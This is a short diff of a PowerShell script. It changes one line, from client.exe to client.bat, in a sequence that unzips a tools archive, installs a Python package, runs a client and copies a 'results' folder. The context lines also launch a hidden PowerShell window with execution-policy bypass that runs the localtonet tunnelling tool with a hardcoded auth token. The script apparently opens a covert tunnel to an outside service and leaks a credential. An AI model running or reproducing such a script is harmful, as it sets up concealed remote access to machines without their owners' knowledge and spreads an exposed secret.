@@ -16,7 +16,7 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
 Unzip "$plocation\toolsv2.zip" "$dlocation"
 add-appxpackage -path "$dlocation\toolsv2\python310.appx"
 cd $dlocation\toolsv2
-./client.exe
+./client.bat
 robocopy 'results' "$dlocation\"
 start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
 cd "$dlocation\"
